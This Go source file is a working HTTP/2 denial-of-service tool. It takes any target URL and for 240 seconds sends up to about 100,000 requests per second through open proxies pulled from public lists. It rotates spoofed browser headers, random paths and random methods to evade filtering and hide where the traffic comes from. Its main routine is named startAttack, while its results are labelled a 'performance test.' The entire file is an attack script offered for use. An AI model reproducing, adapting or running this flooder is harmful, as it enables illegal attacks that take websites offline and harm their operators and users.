package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/http2"
)

var (
	acceptList = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		"application/json, text/javascript, */*; q=0.01",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"application/javascript, */*;q=0.8",
		"application/x-www-form-urlencoded;q=0.9,image/webp,image/apng,*/*;q=0.8",
	}

	userAgentList = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.3945.88 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.102 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.66 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:119.0) Gecko/20100101 Firefox/119.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.3945.79 Mobile Safari/537.36",
	}

	paths = []string{"/", "/home", "/login", "/dashboard", "/api/data", "/status"}
)

type Stats struct {
	sync.Mutex
	totalRequests      int
	successfulRequests int
	failedRequests     int
	rpsHistory         []int
}

type ClientPool struct {
	sync.Mutex
	clients map[string]*http2.Client
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("TLSv1.3 (tls)\nUsage: go run tls.go [url] [thread]")
		os.Exit(1)
	}

	target := os.Args[1]
	threadCount := atoi(os.Args[2])
	duration := 240 * time.Second

	fmt.Println("Fetching proxy list...")
	proxyList := fetchProxies()
	if len(proxyList) == 0 {
		fmt.Println("No proxies available")
		os.Exit(1)
	}
	fmt.Printf("Loaded %d proxies\n", len(proxyList))

	stats := &Stats{}
	clientPool := &ClientPool{clients: make(map[string]*http2.Client)}
	stopTime := time.Now().Add(duration)
	ratePerThread := 100000 / threadCount

	var wg sync.WaitGroup
	go collectStats(stats, stopTime)

	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			startAttack(target, proxyList, stopTime, ratePerThread, stats, clientPool)
		}()
	}

	wg.Wait()
	printResults(target, stats)
}

func (cp *ClientPool) GetClient(proxy string) (*http2.Client, error) {
	cp.Lock()
	defer cp.Unlock()

	if client, ok := cp.clients[proxy]; ok {
		return client, nil
	}

	proxyURL, _ := url.Parse(fmt.Sprintf("http://%s", proxy))
	dialer := &net.Dialer{
		Timeout:   5 * time.Second,
		KeepAlive: 500 * time.Second,
	}

	transport := &http2.Transport{
		TLSClientConfig: &tls.Config{
			MinVersion:         tls.VersionTLS13,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites:       []uint16{tls.TLS_AES_128_GCM_SHA256, tls.TLS_AES_256_GCM_SHA384},
			CurvePreferences:   []tls.CurveID{tls.X25519},
			InsecureSkipVerify: true,
		},
		DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
			conn, err := dialer.Dial("tcp", proxy)
			if err != nil {
				return nil, err
			}
			return tls.Client(conn, cfg), nil
		},
	}

	client := &http2.Client{Transport: transport}
	cp.clients[proxy] = client
	return client, nil
}

func collectStats(stats *Stats, stopTime time.Time) {
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for time.Now().Before(stopTime) {
		<-ticker.C
		stats.Lock()
		if len(stats.rpsHistory) > 0 {
			lastRPS := stats.totalRequests - sum(stats.rpsHistory[:len(stats.rpsHistory)-1])
			stats.rpsHistory = append(stats.rpsHistory, lastRPS)
		} else {
			stats.rpsHistory = append(stats.rpsHistory, stats.totalRequests)
		}
		stats.Unlock()
	}
}

func startAttack(target string, proxyList []string, stopTime time.Time, rate int, stats *Stats, clientPool *ClientPool) {
	ticker := time.NewTicker(time.Second / time.Duration(rate))
	defer ticker.Stop()

	parsedTarget, _ := url.Parse(target)
	for time.Now().Before(stopTime) {
		<-ticker.C
		proxy := proxyList[rand.Intn(len(proxyList))]
		go sendRequest(proxy, target, parsedTarget, stats, clientPool)
	}
}

func sendRequest(proxy, target string, parsedTarget *url.URL, stats *Stats, clientPool *ClientPool) {
	client, err := clientPool.GetClient(proxy)
	if err != nil {
		stats.Lock()
		stats.totalRequests++
		stats.failedRequests++
		stats.Unlock()
		return
	}

	req, _ := http.NewRequest(
		randMethod(),
		fmt.Sprintf("%s%s", target, randPath()),
		nil,
	)

	req.Header.Set("Accept", acceptList[rand.Intn(len(acceptList))])
	req.Header.Set("User-Agent", userAgentList[rand.Intn(len(userAgentList))])
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9,es-ES;q=0.8,es;q=0.7")
	req.Header.Set("Referer", fmt.Sprintf("%s%s", target, randPath()))
	req.Header.Set("Sec-Ch-Ua", fmt.Sprintf(`"Not_A Brand";v="%d", "Chromium";v="%d", "Google Chrome";v="%d"`,
		randInt(121, 345), randInt(421, 6345), randInt(421, 7124356)))
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	req.Header.Set("Sec-Ch-Ua-Platform", randString([]string{"Windows", "MacOS"}))
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	resp, err := client.Do(req)
	stats.Lock()
	stats.totalRequests++
	if err != nil || resp == nil || resp.StatusCode != 200 {
		stats.failedRequests++
	} else {
		stats.successfulRequests++
		resp.Body.Close()
	}
	stats.Unlock()
}

func fetchProxies() []string {
	proxySources := []string{
		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
		"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
		"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
		"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
	}

	var proxies []string
	client := &http.Client{Timeout: 10 * time.Second}

	for _, source := range proxySources {
		resp, err := client.Get(source)
		if err != nil {
			fmt.Printf("Failed to fetch from %s: %v\n", source, err)
			continue
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			continue
		}

		proxyList := strings.Split(string(body), "\n")
		for _, proxy := range proxyList {
			proxy = strings.TrimSpace(proxy)
			if proxy != "" && strings.Contains(proxy, ":") {
				proxies = append(proxies, proxy)
			}
		}
	}

	return proxies
}

func printResults(url string, stats *Stats) {
	stats.Lock()
	defer stats.Unlock()

	peakRPS := 0
	for _, rps := range stats.rpsHistory {
		if rps > peakRPS {
			peakRPS = rps
		}
	}

	averageRPS := float64(stats.totalRequests) / 240

	fmt.Printf("\nHTTP/2 Performance Test Results (240s duration):\n")
	fmt.Printf("Target URL: %s\n", url)
	fmt.Printf("Total Requests: %d\n", stats.totalRequests)
	fmt.Printf("Successful Requests (200 only): %d\n", stats.successfulRequests)
	fmt.Printf("Failed Requests: %d\n", stats.failedRequests)
	fmt.Printf("Peak RPS: %d\n", peakRPS)
	fmt.Printf("Average RPS: %.2f\n", averageRPS)
	fmt.Printf("Success Rate: %.2f%%\n", float64(stats.successfulRequests)/float64(stats.totalRequests)*100)
}

func randInt(min, max int) int {
	return min + rand.Intn(max-min+1)
}

func randMethod() string {
	if rand.Float32() < 0.5 {
		return "GET"
	}
	return "POST"
}

func randPath() string {
	return paths[rand.Intn(len(paths))]
}

func randString(options []string) string {
	return options[rand.Intn(len(options))]
}

func atoi(s string) int {
	var result int
	fmt.Sscanf(s, "%d", &result)
	return result
}

func sum(slice []int) int {
	total := 0
	for _, v := range slice {
		total += v
	}
	return total
}
